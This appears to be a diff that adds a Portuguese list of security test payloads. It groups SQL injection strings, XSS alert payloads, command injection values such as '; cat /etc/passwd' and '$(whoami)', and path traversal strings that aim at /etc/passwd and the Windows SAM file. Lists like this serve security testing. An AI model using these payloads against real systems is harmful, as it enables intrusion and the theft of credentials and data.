@@ -1,0 +1,40 @@
+# Payloads de Teste de Segurança
+
+## SQL Injection
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin'--
+admin'/*
+' OR 1=1--
+' UNION SELECT NULL--
+1' OR '1'='1
+' OR 'x'='x
+admin' OR '1'='1
+' OR 1=1#
+' OR 'a'='a
+') OR ('1'='1
+1' OR '1'='1'--
+' OR '1'='1' LIMIT 1--
+
+## XSS (Cross-Site Scripting)
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+javascript:alert('XSS')
+<iframe src=javascript:alert('XSS')>
+'"><script>alert('XSS')</script>
+<body onload=alert('XSS')>
+
+## Comandos do Sistema (Command Injection)
+; ls
+| whoami
+`id`
+$(whoami)
+; cat /etc/passwd
+| cat /etc/passwd
+
+## Path Traversal
+../../../etc/passwd
+..\..\..\windows\system32\config\sam
+....//....//etc/passwd
